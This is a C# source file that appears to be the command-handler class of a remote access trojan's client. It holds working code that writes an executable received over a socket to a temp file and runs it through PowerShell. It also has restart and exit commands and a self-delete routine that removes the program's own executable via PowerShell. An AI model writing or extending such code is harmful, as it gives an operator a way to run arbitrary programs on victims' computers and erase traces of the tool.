using Client.Helper;
using Client.Networking;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Client.PacketHandler
{
    public class HandlerClientOption
    {
        public void Update(byte[] fileBytes)
        {
            try
            {
                string tempFile = Path.GetTempFileName() + ".exe";
                using (FileStream fileStream = new FileStream(tempFile, FileMode.Create))
                {
                    fileStream.Write(fileBytes, 0, fileBytes.Length);
                }
                new Powershell().Run($"Start-Process -FilePath '{tempFile}'");
                Delete();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
            }
        }

        public void Close()
        {
            try
            {
                StaticClient.ClientSocket.Close();
            }
            catch { }
            finally
            {
                Environment.Exit(0);
            }
        }

        public void Restart()
        {
            try
            {
                StaticClient.ClientSocket.Close();
            }
            catch { }
            finally
            {
                new Powershell().Run($"Start-Process -FilePath '{Application.ExecutablePath}'");
                Environment.Exit(0);
            }
        }

        public void Delete()
        {
            try
            {
                StaticClient.ClientSocket.Close();
            }
            catch { }
            finally
            {
                try
                {
                    new Powershell().Run($"Start-Sleep -Seconds 1; Remove-Item -Path '{Application.ExecutablePath}'");
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                }
            }
        }
    }
}
